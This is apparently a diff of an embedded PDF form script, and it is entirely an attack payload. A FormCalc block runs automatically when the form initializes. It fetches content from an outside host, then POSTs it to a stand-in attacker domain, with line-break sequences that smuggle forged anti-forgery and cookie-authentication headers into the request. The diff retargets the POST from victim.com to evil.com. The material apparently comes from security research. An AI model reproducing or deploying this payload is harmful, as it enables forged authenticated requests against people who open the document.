@@ -13,7 +13,7 @@ stream
             <event activity="initialize">
                 <script contentType='application/x-formcalc'>
                     var content = GET("https://bughunt1307.herokuapp.com/googlecsrf.txt")
-                    POST("https://victim.com",content,"text/plain","charset=UTF-8&#xD;&#xA;X-SupportContent-AllowApiCookieAuth: true&#xD;&#xA;X-SupportContent-XsrfToken: csrf&#xD;&#xA;add-whatever-header: you-want&#xD;&#xA;")
+                    POST("https://evil.com",content,"text/plain","charset=UTF-8&#xD;&#xA;X-SupportContent-AllowApiCookieAuth: true&#xD;&#xA;X-SupportContent-XsrfToken: csrf&#xD;&#xA;add-whatever-header: you-want&#xD;&#xA;")
                 </script>
             </event>
         </field>
